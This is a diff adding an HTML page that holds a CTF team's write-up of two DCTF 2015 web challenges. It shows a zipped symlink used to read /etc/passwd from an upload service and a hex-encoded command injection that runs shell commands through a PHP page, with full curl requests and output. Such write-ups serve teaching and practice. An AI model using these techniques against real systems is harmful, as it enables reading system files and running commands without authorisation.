@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html>
+    <title>Tontons Fl4ggeurs</title>
+    <meta id='page-params'
+    theme='journal'
+    title='Tontons Fl4ggeurs'
+    menu='Home,index.html,WriteUp du MMA,MMA/index.html,WriteUp du CSAW,CSAW/index.html,WriteUp du DCTF,DCTF/index.html'
+    active='4'
+    root='/'>
+    <xmp>
+<br/>
+<br/>
+
+********************
+## [Web](#) *200*
+by vic511
+********************
+
+First of all, the home page is explaining us the concept: it's an online tool where you can upload zip files, and explore freely their content. We can see in the source code something interesting:
+
+```php
+<? $shell = shell_exec("getent passwd dctf | cut -d: -f7"); ?>
+```
+
+Then we can suppose the server is running PHP under Linux, and we know what data should we be able to get. I uploaded some files containing special chars, in the zip file name or in the zipped files, but I had no significant results. The output of the commande unzip archive.zip (the name of the uploaded file is renamed to archive.zip) may have been an attack vector, but I couldn't exploit it in any ways.
+I've been looking on the web if I could zip symlinks, therefore I tried to access the content of `/etc/passwd` by zipping a symlink pointing to it.
+
+```bash
+vic511@vic511:~/challenges/ctfs/dctf2k15/web$ ln -s /etc/passwd passwd
+```
+
+Then zip it with the --symlinks option (etiher way it would just zip the content of your /etc/passwd).
+
+```bash
+vic511@vic511:~/challenges/ctfs/dctf2k15/web$ zip --symlinks -r h.zip passwd
+```
+
+Now it's time to upload the malicious zip file. Once it's uploaded, the passwd file is not shown as existing, but don't worry, it's here.
+All you have to do now is getting its content !
+
+```bash
+vic511@vic511:~/challenges/ctfs/dctf2k15/web$ curl "http://10.13.37.3/?id=xxx&file=./passwd"
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+libuuid:x:100:101::/var/lib/libuuid:
+sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin
+syslog:x:102:105::/home/syslog:/bin/false
+ubuntu:x:1000:1000::/home/ubuntu:/bin/bash
+mysql:x:103:106:MySQL Server,,,:/nonexistent:/bin/false
+dctf:x:65533:65533:DCTF,,,:/nonexistent:/DCTF{28fad39245bc57404263540e94f417d8}
+```
+
+> The flag is DCTF{28fad39245bc57404263540e94f417d8} !
+
+********************
+## [Web](#) *400*
+by vic511
+********************
+
+In this challenge, we can see an ugly web page showing images. Every image is linked with an user, and we can access them by giving parameters to index.php: http://10.13.37.5/?id=1&usr=1
+I messed up with the parameters, and got an interesting information, the images are outputed through the linux command cat. I tried unsuccessfully to get a RCE, because the page was only accepting numeric values. I suddenly remembered that PHP is very flexible, and would consider strings such as `0xdeadbeef` as numeric.
+
+```bash
+vic511@vic511:~/challenges/ctfs/dctf2k15/web$ curl "http://10.13.37.5/?usr=3&id=0xdeadbeef" -vvv
+* Hostname was NOT found in DNS cache
+*   Trying 10.13.37.5...
+* Connected to 10.13.37.5 (10.13.37.5) port 80 (#0)
+> GET /?usr=3&id=0xdeadbeef HTTP/1.1
+...
+&lt; 
+cat: images/ޭ��_269.jpg: No such file or directory
+* Connection #0 to host 10.13.37.5 left intact
+```
+
+Very nice ! We can then bypass the filter and use hexadecimal strings to get a RCE ! I'm gonna use the xxd tool to generate the hexadecimal string, so the commands are gonna be human readable.
+
+```bash
+vic511@vic511:~/challenges/ctfs/dctf2k15/web$ curl "http://10.13.37.5/?usr=3&id=0x$(echo "lol;ls -la 2>&1" | xxd -p)" -vvv
+* Hostname was NOT found in DNS cache
+*   Trying 10.13.37.5...
+* Connected to 10.13.37.5 (10.13.37.5) port 80 (#0)
+> GET /?usr=3&id=0x6c6f6c3b6c73202d6c6120323e26310a HTTP/1.1
+...
+&lt; 
+total 44
+drwxr-xr-x 3 root root  4096 Oct  3 16:15 .
+drwxr-xr-x 3 root root  4096 Oct  1 22:08 ..
+-rw-r--r-- 1 root root    17 Oct  1 22:20 .htaccess
+-rw-r--r-- 1 root root    38 Oct  1 22:14 6e8218531e0580b6754b3e3be5252873.txt
+drwxrwxr-x 2 root root  4096 Oct  1 22:14 images
+-rw-r--r-- 1 root root 21392 Oct  1 22:17 index.php
+sh: 2: _269.jpg: not found
+* Connection #0 to host 10.13.37.5 left intact
+```
+
+w00t ! Here we go, let's see what's inside this weird text file.
+
+```bash
+vic511@vic511:~/challenges/ctfs/dctf2k15/web$ curl "http://10.13.37.5/?usr=3&id=0x$(echo "lol;cat 6*" | xxd -p)" -vvv
+* Hostname was NOT found in DNS cache
+*   Trying 10.13.37.5...
+* Connected to 10.13.37.5 (10.13.37.5) port 80 (#0)
+> GET /?usr=3&id=0x6c6f6c3b63617420362a0a HTTP/1.1
+...
+&lt; 
+DCTF{19b1f9f19688da85ec52a735c8da0dd3}sh: 2: _269.jpg: not found
+* Connection #0 to host 10.13.37.5 left intact
+```
+
+> The flag is DCTF{19b1f9f19688da85ec52a735c8da0dd3} :)
+    </xmp>
+    <script src="http://smzg.github.io/strapdown/example/config/strapdown.js"></script>
+</html>
+
